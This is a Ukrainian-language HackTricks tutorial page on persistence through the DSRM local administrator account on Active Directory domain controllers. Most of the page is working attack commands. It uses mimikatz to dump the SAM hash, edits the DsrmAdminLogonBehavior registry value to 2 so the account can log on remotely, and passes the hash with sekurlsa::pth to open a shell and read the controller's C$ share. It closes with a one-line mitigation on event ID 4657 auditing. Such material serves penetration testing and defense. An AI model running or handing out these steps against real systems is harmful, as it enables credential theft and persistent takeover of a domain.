{{#include ../../banners/hacktricks-training.md}}

# DSRM Credentials

Існує обліковий запис **локального адміністратора** в кожному **DC**. Маючи адміністративні привілеї на цій машині, ви можете використовувати mimikatz для **вивантаження хешу локального адміністратора**. Потім, змінивши реєстр, щоб **активувати цей пароль**, ви зможете віддалено отримати доступ до цього локального облікового запису адміністратора.\
Спочатку нам потрібно **вивантажити** **хеш** облікового запису **локального адміністратора** всередині DC:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Тоді нам потрібно перевірити, чи цей обліковий запис працює, і якщо ключ реєстру має значення "0" або не існує, вам потрібно **встановити його на "2"**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Потім, використовуючи PTH, ви можете **переглянути вміст C$ або навіть отримати оболонку**. Зверніть увагу, що для створення нової сесії PowerShell з цим хешем в пам'яті (для PTH) **"домен", що використовується, - це просто ім'я машини DC:**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Більше інформації про це за адресами: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) та [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)

## Пом'якшення

- ID події 4657 - Аудит створення/зміни `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`

{{#include ../../banners/hacktricks-training.md}}
